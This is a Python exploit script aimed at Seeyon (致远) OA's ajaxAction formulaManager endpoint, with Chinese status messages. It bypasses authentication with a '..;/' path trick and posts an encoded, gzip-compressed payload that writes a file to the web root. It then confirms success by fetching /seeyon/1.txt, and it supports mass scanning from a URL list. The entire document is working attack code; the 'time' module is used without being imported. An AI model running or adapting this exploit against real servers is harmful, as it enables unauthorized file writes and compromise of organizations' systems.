import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# 上传文件到 /seeyon/1.txt 文件内容：1234,
def _start(target_url):
    try:
        vuln_url_2 = target_url + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
        print('\033[36m[o] 正在请求: {}'.format(vuln_url_2))
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data="managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uQ%C3%81N%C3%830%0C%3D%C3%83WX%C2%BD%C2%A4%13%23%C3%95%10B%C2%88i%C2%87M%0C%C2%89%03%13%C3%92%C2%8A8+%0E%C2%A1uYP%C2%9BDI%C3%8A%3A%C2%AA%C3%BD%3B%C3%89Rh%25F.%C3%8F%7E%C2%B1%C3%9F%C2%B3%C3%A5%C2%97%C2%96%14RWu%C3%89%C3%92%C2%9DBr%03%C2%931%C3%BC0%2BVy%C2%86X4%C2%96%C3%B4%C3%B4%C2%B2Q%1A%C2%8D%C3%A1R%C3%B8%C3%8F%C2%B5%C3%95%5C%C2%BC%C2%83bv%033%C2%88%28M%C2%B6%C3%B8%C3%86%C2%942%C2%89A%C3%9CI%C2%91D%C3%93S%08%C3%AF%C3%A4%C2%83%7D2%C3%8A%25%7Dt-%C3%B6Ys%C2%8B%1AT%1F_8%01%C2%81%5B8R%16%7B%C3%BD%C2%B3hBmc%C2%A3%C3%91%C2%AF%22t%C3%AEf%C2%83e%C3%A9%C3%AD%1F%C3%92%C3%BB%C2%AF%C3%95%5C%C3%8EzS0%C2%B5%C2%A0%157%19%5D%C3%8C%C3%97%C3%8B%C2%AB%C3%8B%5B%C3%8Cd%C3%AE%7C%C3%B3%0E%C2%83%C3%A5%C3%B1%C2%A2%C3%B8%C2%AFSh%C3%AB%C2%92%C3%90%1B%C2%92%C2%B8%13%C2%A4%01%17uQ8%C2%81%C3%83%60%C2%A3q%C3%B4%C2%94%C3%9E%C2%9D_%0F%07%1F%C2%AEM%0FI%29%C3%A2%C2%A1%C3%B8%7F%C2%B5Y%29%0D%C2%BA%C3%81%C3%B6S%7F%16%17%C3%A4X%C2%80%C2%B1%C3%8C%C3%B2%0C%C2%9A%C2%A6%C2%89G-%C3%99%C2%BB%5B%C2%B9%7B%C2%B5%1E%C2%AD%C2%AE%C2%91%C2%BC%7E%03%24oB%C2%B2%C3%A6%01%00%00"
        resp1 = requests.post(url=vuln_url_2, headers=headers, data=data, verify=False)
        if resp1.status_code==500:
            check_url = target_url + "/seeyon/1.txt"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            }
            resp2 = requests.get(url=check_url, timeout=10, verify=False, headers=headers)
            if resp2.status_code==200 and '1234' in resp2.text:
                print("\033[32m[+] 目标 {} 存在 致远OA ajaxAction formulaManager 漏洞 : {}/seeyon/1.txt\033[0m".format(target_url,target_url))
            else:
                print("\033[31m[x] 目标漏洞无法利用，写入失败 \033[0m")
                sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用，写入失败 {} \033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help='Start scanning url')
    parser.add_argument("-f", "--file", help='read the url from the file')
    args = parser.parse_args()
    if args.url:
        _start(args.url)
    elif args.file:
        f = open(args.file, "r")
        all = f.readlines()
        for i in all:
            url = i.strip()
            _start(url)
            time.sleep(0.2)